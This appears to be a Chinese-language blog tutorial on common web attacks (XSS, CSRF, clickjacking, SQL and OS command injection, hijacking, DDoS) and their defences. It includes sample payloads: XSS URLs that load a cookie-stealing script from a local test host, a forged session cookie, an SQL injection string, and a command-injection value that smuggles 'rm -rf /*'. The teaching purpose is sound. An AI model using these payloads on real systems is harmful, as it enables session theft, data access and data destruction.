---
title: 常见web攻击
date: 2020-07-30 19:28:48
tags:
---
# XSS
Cross Site Script跨站脚本攻击。跨站脚本攻击是指通过存在安全漏洞的web网站，在用户的浏览器内运行非法的非本站点的javaScript脚本而进行的一种攻击。

跨站脚本攻击可能的影响：
1. 利用虚假输入表单骗取用户个人信息
2. 利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
3. 显示伪造的文章或图片。

## xss攻击分类
### 基于DOM的XSS攻击
一般来说，hacker不能劫持正常的网络传输，但如果有内鬼通过中间人代理劫持HTML传输，就可以修改html文件在其中任意穿插恶意脚本，再发送给用户。一般来说，这种情况出现在运营商中间。
### 存储型XSS攻击
步骤：
1. 首先hacker利用站点漏洞将一段恶意javaScript代码提交到网站的数据库中。
2. 然后用户向网站请求包含了恶意javaScript脚本的页面。
3. 当用户浏览该页面的时候，恶意脚本就会将用户的cookie信息等数据上传到hacker服务器。

### 反射型-url参数直接注入
hacker找到有漏洞的接口，用户给服务器发送的一些参数后，服务器没有经过处理，直接原样返回了部分参数。
就给黑客可趁之机，把恶意js脚本当参数发给服务器，服务器直接返回了这个脚本字符串，在浏览器DOM解析器中就能顺利引入这个恶意脚本达成hack。

反射型XSS和存储型XSS最大的区别就是，反射型不会在服务器存储脚本，需要诱骗用户主动点击包含漏洞的url。存储型主要在于上传恶意脚本到服务器，后面只需要等待用户点击网页。
```bash
# 普通
http://localhost:3000/?from=china

#  alert 尝试
http://localhost:3000/?from=<script>alert(3)</script>

#  获取Cookie
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js">

# 短域名伪造https://dwz.cn/
#  伪造cookie入侵 chrome
document.cookie="kaikeba:sess=eyJ1c2VybmFtZSI6Imxhb3dhbmciLCJfZXhwaXJlIjoxNTUzNT Y1MDAxODYxLCJfbWF4QWdlIjo4NjQwMDAwMH0="
```
## xss 攻击的危害
简单来说Script脚本能干啥就能干啥。
1. 获取页面的数据
2. 获取Cookie
3. 劫持前端逻辑
4. 发送请求
5. 偷取网站的任意数据
6. 偷取用户的资料
7. 偷取用户的秘密和登录态
8. 欺骗用户
## xss 防范手段
### 转义字符 & ejs转义
对于用户的输入永远做不可信任处理，最普遍的做法就是转义输入输出的内容，对引号，尖括号，斜杠进行转义。
```js
function escape(str) {
    str = str.replace(/&/g, '&amp;') 
    str = str.replace(/</g, '&lt;') 
    str = str.replace(/>/g, '&gt;')  
    str = str.replace(/"/g, '&quto;')
    str = str.replace(/'/g, '&#39;') 
    str = str.replace(/`/g, '&#96;')  
    str = str.replace(/\//g, '&#x2F;')  
    return str
}
```
ejs模板引擎中：
```js
<% code %> 用于执行其中javaScript 代码
<%= code %> 会对code进行html转义
<%- code %> 将不会进行转义
```

对于富文本来说，显然不能通过上面的办法来转义所有的字符，因为这样会把需要的格式也过滤掉。对于这种情况，通常采用的是白名单过滤的办法。
```js
const xss = require('xss')
let html = xss('<h1 id="title">XSS Demo</h1><script>alert("xss");</script>')
console.log(html) //  <h1>XSS Demo</h1>&lt;script&gt;alert("xss");&lt;/script&gt; 
```
### 设置Header
禁止xss过滤，因为这个设置本身有很高的安全隐患，当注入相同名字的脚本时，会导致浏览器误判，使原本使用的同名的第三方库也无法使用。
```js
ctx.set('x-xss-Protection', 0) 

// 0 禁止XSS过滤

// 1 启用XSS过滤，浏览器默认启用。如果检测到跨站脚本攻击，浏览器将清除页面(删除不安全的部分)。

// 1; mode=block 启用xss过滤，如果哦检测到攻击，浏览器将不会清除页面，而是阻止页面加载。

// 1; report=<reporting-URI> 启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri指令的功能发送违规报告。
```

### CSP(Content Security Policy)
CSP,内容安全策略是一个附加的安全层，用于帮助检测和缓解某些类型的攻击，包括跨站脚本和数据注入等攻击。这些攻击可用于实现从数据窃取到网站破坏或作为恶意软件分发版本等用途。

CSP本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少XSS攻击。

```bash
# 只允许加载本站资源
Content-Security-Policy: default-src 'self'
# 只允许加载HTTPS协议图片
Content-Security-Policy: img-src https://*
# 不允许加载任何来源框架
Content-Security-Policy: child-src 'none'

# 尝试一下外部资源不能加载 http://localhost:3000/?from=<script src="http://localhost:4000/hack.js"> </script>
ctx.set('Content-Security-Policy', "default-src 'self'")
 
```
### HttpOnly Cookie
这是预防XSS攻击窃取用户cookie最有效的防御手段。web应用程序在设置cookie时，将其属性设为HttpOnly后，客户端脚本就不能读取到cookie，从而保护用户cookie信息。
```js
response.addHeader('Set-Cookie', 'uid=112; Path=/; HttpOnly')
```
### cookie值进行hash
攻击者在访问信任网站A时，虽然浏览器可以在请求中带上cookie，但是网站A不仅仅通过cookie来判断用户身份，同时通过用户发送过来的内容中的伪随机数来判断请求真正是用户发送的。攻击者在请求A的时候，不能在提交的内容中产生伪随机数(通过cookie哈希化的值)。

# CSRF(Cross Site Request Forgery)
跨站请求伪造,是一种常见的Web攻击，它利用用户已经登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。
## 原理
1. 用户已经登录了站点A，并在本地记录了cookie。
2. 在用户没有登出站点A的情况下(也就是cookie生效的情况下)，访问了恶意攻击提供的危险站点B(B站点要求访问A站点)。
3. A站点没有做任何CSRF防御。
## CSRF 攻击危害
1. 利用用户登录态
2. 用户不知情
3. 完成业务请求
4. 盗取用户资金(转账，消费)
5. 冒充用户发帖
6. 损害网站声誉
## CSRF 防御
1. 禁止第三方网站带Cookie(有兼容性问题)
2. 同源检测(referer check),Https 不发送 referer。
```js
app.use(async (ctx, next) => {
    await next()
    const referer = ctx.request.header.referer
    console.log('Referer:', referer) 
})
```
3. 验证码

# 点击劫持(clickjacking) 
点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过iframe嵌入自己的网页中，并将iframe设置为透明，在页面中透出一个按钮诱导用户点击。

## clickjacking 防御
1. X-FRAME-OPTIONS
X-FRAME-OPTIONS 是一个HTTP响应头，在现代浏览器有一个很好的支持。这个HTTP响应头就是为了防御用iframe嵌套的点击劫持攻击。该响应头有三个值可以选择，分别是DENY，表示页面不允许通过iframe的方式展示；SAMEORIGIN，表示页面可以在相同域名下通过iframe的方式展示；ALLOW-FROM，表示页面可以在指定来源的iframe中展示。
```js
ctx.set('X-FRAME-OPTIONS', 'DENY')
```
2. JS防御方式
判断当前页面窗口self和主窗口top是否相同当通过，当iframe 的方式加载页面时，攻击者的网页直接不显示所有内容了。 
```html
<head> 
    <style id="click-jack">
        html {   
            display: none !important;
        }
    </style>
</head> 
<body> 
    <script>
        if (self == top) {  // 相同，则没有iframe嵌入，移除样式
            var style = document.getElementById('click-jack')
            document.body.removeChild(style) 
        } else { // 不相同，则有iframe嵌入，则跳转到自己的页面导航地址
            top.location = self.location  
        } 
    </script>
</body>
```
# SQL注入
## 原理
```js
// 填入特殊密码 
1'or'1'='1
// 拼接后的SQL 这样也能从数据库查到
 SELECT * FROM test.user WHERE username = 'laowang' AND password = '1'or'1'='1'
```
## 防御
所有的查询语句建议使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户 输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的 query 方法中的 ? 占位参数。
```js
// 错误写法
const sql = `SELECT * FROM test.user WHERE username = '${ctx.request.body.username}' AND password = '${ctx.request.body.password}'`

console.log('sql', sql)
const res = await query(sql)

// 正确的写法
const sql = `SELECT * FROM test.user WHERE username = ? AND password = ?`
console.log('sql', sql)
const res = await query(sql, [ctx.request.body.username, ctx.request.body.password])
```
严格限制web应用的数据库的操作权限，给此用户提供仅仅能满足其工作的最低权限，从而最大限度的减少注入攻击对数据库的危害。

后端代码检查输入的数据是否符合预期，严格限制变量的类型，例如使用正则表达式进行一些匹配处理。

对进入数据库的特殊字符(',",\,<,>,&,*,;等)进行转义处理，或编码转换。基本上所有的后端语言都有对字符串进行转义处理的方法，比如lodash的lodash._escapehtmlchar。

# OS命令注入
OS命令注入和SQL注入差不多，只不过SQL注入是针对数据库的，而OS命令注入是针对操作系统的。OS命令注入攻击指通过web应用，执行非法的操作系统命令达到攻击的目的。只要在能调用Shell函数的地方就有存在被攻击的风险。如果调用Shell时存在疏漏，就可以职系那个插入的非法命令。
```js
// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo
const exec = require('mz/child_process').exec; 
let params = {/* 用户输入的参数 */}; 
exec(`git clone ${params.repo} /some/path`);

// 如果传入的参数如下, 就会出现删除文件夹的危险操作
const params = 'https://github.com/xx/xx.git && rm -rf /* &&'
```
# 请求劫持
## DNS 劫持
顾名思义，就是DNS服务器解析各个步骤被篡改，修改了域名解析的结果，使得访问到的不是预期的不是预期的IP地址。
## HTTP劫持
运营商劫持，只能升级到HTTPS。

# DDOS (distributed denial of service )
DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网 站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪 服务的目的。
其中，比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来大量正常的请求，超出服务器的最大承 受量，导致宕机。
## 常见的攻击方式
### SYN Flood
此攻击通过向目标发送具有欺骗性源IP地址的大量TCP“初始连接请求”SYN数据包来利用TCP握 手。目标机器响应每个连接请求，然后等待握手中的最后一步，这一步从未发生过，耗尽了进程 中的目标资源。

### HTTP Flood
此攻击类似于同时在多个不同计算机上反复按Web浏览器中的刷新 - 大量HTTP请求泛滥服务器， 导致拒绝服务。

## 防御手段
### 备份网站
备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公告，告诉用户，网站出现了问题，正在全力抢修。
### HTTP请求的来拦截
高防IP- 靠谱的运营商 多个Docker
硬件： 服务器 防火墙
带宽扩容 + cdn
提高犯罪成本